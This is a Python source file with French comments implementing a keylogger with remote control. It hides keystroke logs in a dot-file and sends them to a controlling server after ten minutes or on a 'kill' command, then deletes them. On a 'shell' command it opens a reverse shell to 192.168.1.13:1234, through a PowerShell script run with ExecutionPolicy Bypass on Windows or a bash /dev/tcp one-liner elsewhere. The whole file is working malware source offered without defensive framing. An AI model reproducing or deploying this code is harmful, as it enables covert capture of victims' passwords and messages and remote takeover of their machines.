import platform
import time
import os
import client
from threading import Thread
from pynput.keyboard import Listener
from cryptography.fernet import Fernet

"""
fonction qui enregistre les touches pressées  dans un fichier
"""

def on_press(key):
    keyFormat = "key_press:{0}\n".format(key)
    with open('.document1.txt', '+a') as file:
        file.write(keyFormat)
"""
fonction qui enregistre les touches relachées dans un fichier
"""

def on_release(key):
    keyFormat = "key_release{0}\n".format(key)
    with open('.document1.txt', '+a') as file:
        file.write(keyFormat)

"""
fonction qui reçoit les messages du serveur et exécute les commandes
"""

def receive_message(mysocket, listener):
    key = "Y7AYXeoiELaca2QtHeTubSGmbTOu27QyYin2f-Wfr3s=" # clé de chiffrement et de déchiffrement
    cipher_suite = Fernet(key) # création d'une instance de la classe Fernet

    while True:
        try:
            print("Waiting for data...")
            data = mysocket.recv(1024) # réception des données
            decrypted_data = cipher_suite.decrypt(data).decode("utf-8") # déchiffrement des données

            if decrypted_data == "kill": # si le message reçu est "kill" 
                listener.stop() # arrêt du keylogger
                client.send_file_securely(mysocket) # envoi du fichier de capture
                client.stop_and_delete_capture_file() # suppression du fichier de capture
            elif "shell" == decrypted_data: # si le message reçu est "shell"
                if platform.uname().system == 'Windows': # si le système d'exploitation est Windows lance un reverse shell en PowerShell
                    reverse_payload = '''
$client = New-Object System.Net.Sockets.TcpClient("192.168.1.13",1234)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + $PWD.Path + "> "
    $sendbyte = [text.encoding]::ASCII.GetBytes($sendback2)
    $sendbyte | Out-File -FilePath $env:TEMP\output.txt -Append
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
'''
                    ps_script_path = os.path.join(os.environ['TEMP'], 'reverse_payload.ps1') # chemin du script PowerShell
                    with open(ps_script_path, 'w') as ps_file: # écriture du script dans un fichier
                        ps_file.write(reverse_payload) 

                    os.system(f'powershell -ExecutionPolicy Bypass -File {ps_script_path}') # exécution du script
                else:
                    reverse_payload = "bash -i >& /dev/tcp/192.168.1.13/1234 0>&1" # sinon lance un reverse shell en bash
                    os.system(reverse_payload)
                    
        except Exception as e:
            break


        """
        fonction qui lance le keylogger et envoie le fichier de capture au serveur au bout de 10 minutes
        """

def func_handle_time(period, listener, mysocket):
    try:
        time.sleep(period) # attente de 10 minutes
        listener.stop() # arrêt du keylogger
        client.send_file_securely(mysocket) # envoi du fichier de capture au serveur
        client.stop_and_delete_capture_file() # suppression du fichier de capture
    except Exception:
        pass

"""
fonction qui lance le keylogger et gère les différents threads
"""

def listen_keyboard(mysocket):
    try:
        with Listener(on_press=on_press, on_release=on_release) as listener: 
            Thread(target=receive_message, args=(mysocket, listener)).start()  
            Thread(target=func_handle_time, args=(600.0, listener, mysocket)).start() 
            listener.join()
    except Exception:
        pass
